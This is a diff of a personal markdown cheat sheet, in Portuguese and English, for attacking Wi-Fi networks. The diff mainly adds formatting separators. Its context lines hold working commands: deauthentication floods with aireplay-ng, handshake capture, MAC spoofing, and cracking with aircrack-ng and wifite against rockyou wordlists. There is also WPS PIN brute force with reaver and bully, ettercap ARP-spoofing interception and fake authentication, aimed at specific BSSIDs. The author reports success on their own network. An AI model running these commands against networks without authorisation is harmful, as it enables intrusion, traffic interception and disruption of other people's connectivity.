@@ -17,8 +17,6 @@ categories: [mpsp]
 ---
 
 
-
-
 ## Adaptador USB
 
 Tenho um adaptador com chipset **Ralink RT2070**
@@ -41,6 +39,10 @@ S:  SerialNumber=1.0
 C:  #Ifs= 1 Cfg#= 1 Atr=80 MxPwr=450mA
 I:  If#=0x0 Alt= 0 #EPs= 7 Cls=ff(vend.) Sub=ff Prot=ff Driver=rt2800usb
 ```
+
+<br>
+
+---
 
 ## Change to Monitor Mode
 
@@ -79,6 +81,11 @@ sudo iwconfig wlan0 mode monitor
 sudo ifconfig wlan0 up
 ```
 
+<br>
+
+---
+
+
 ## Sniffing
 
 ```bash
@@ -91,6 +98,10 @@ sudo airodump-ng --bssid 90:F6:52:F0:C5:B4 --channel 1 --write my_network wlan0m
 
 # Abre os pacotes no Wireshark
 ```
+
+<br>
+
+---
 
 ## Change Mac Address
 
@@ -117,12 +128,20 @@ sudo macchanger -mac=XXX wlan0mon
 sudo ifconfig wlan0mon up
 ```
 
+<br>
+
+---
+
 ## Wash
 
 ```bash
 # This shows all WPS enabled Aps using wireless interface.
 sudo wash --interface wlan0mon
 ```
+
+<br>
+
+---
 
 ## AiroDump
 
@@ -146,6 +165,10 @@ sudo airodump-ng -c 1 --bssid 6C:55:E8:C3:C4:98 wlan0mon
 sudo airodump-ng -c 1 --bssid 6C:55:E8:C3:C4:98 -w ~/Documents/gaulia wlan0mon
 ```
 
+<br>
+
+---
+
 ## AirePlay
 
 Para desatenticação
@@ -159,6 +182,10 @@ sudo aireplay-ng --deauth 1 -a 6C:55:E8:C3:C4:98 -c F0:D7:AA:13:C2:41 wlan0mon #
 sudo aireplay-ng --deauth 0 -a 6C:55:E8:C3:C4:98 wlan0mon
 sudo aireplay-ng --help
 ```
+
+<br>
+
+---
 
 ## WordLists
 
@@ -174,9 +201,17 @@ head -10 /usr/share/wordlists/rockyou.txt
 wc -l rockyou2021.txt
 ```
 
-#
+<br>
+
+---
+
+# dd
 
 https://github.com/ohmybahgosh/RockYou2021.txt#download-links
+
+<br>
+
+---
 
 ## AirCrack
 
@@ -187,6 +222,10 @@ aircrack-ng ~/Documents/gaulia-02.cap -w /usr/share/wordlists/rockyou.txt
 
 [David Bombal: AirCrack](https://www.youtube.com/watch?v=WfYxrLaqlN8)
 
+<br>
+
+---
+
 ## Wifite
 
 ```bash
@@ -196,6 +235,10 @@ sudo wifite
 #
 sudo wifite --wpa --dict ~/Documents/Wordlists/rockyou2021/rockyou2021.txt --kill
 ```
+
+<br>
+
+---
 
 ## Reaver
 
@@ -237,10 +280,14 @@ sudo reaver --interface wlan0mon --bssid 94:6A:77:27:29:EE --channel 11 --dh-sma
 sudo reaver --interface wlan0mon --bssid 38:6B:1C:8C:11:F4 --channel 5 --dh-small --no-nacks --delay 15 -vv -w
 ```
 
+<br>
+
+---
+
 ## Bully
 
 ```bash
-# APMP
+# Associação
 sudo bully --bssid D8:C6:78:0F:73:14 --essid VIVO-7314 --eapfail --nofcs --pixiewps --channel 11 --verbosity 4 wlan0mon
 #[!] Received disassociation/deauthentication from the AP
 #[+] Rx(  M1  ) = 'EAPFail'   Next pin '20075361'
@@ -266,6 +313,10 @@ sudo ettercap -T -S -i wlan0mon -M arp:remote /192.168.0.1// /192.168.0.110//
 # After capture using wireshark
 sudo wireshark
 ```
+
+<br>
+
+---
 
 ## Filtros no _Wireshark_
 
@@ -297,7 +348,10 @@ sudo aireplay-ng --fakeauth 30 -a 98:DA:C4:DD:E4:6C -h 98:39:8E:6B:C1:9B wlan0mo
 sudo aireplay-ng --fakeauth 30 -a 70:4F:57:0E:17:58 -h 78:44:76:84:0a:f5 wlan0mon
 ```
 
+<br>
+
 ---
+
 
 ## Tutoriais
 
@@ -312,6 +366,3 @@ Passa a passo
 3. Com reaver, brutal force wifi
 
 Consegui êxito na minha rede pessoal em 12.424 segundos, ou seja, após ~4 horas.
-
-
-
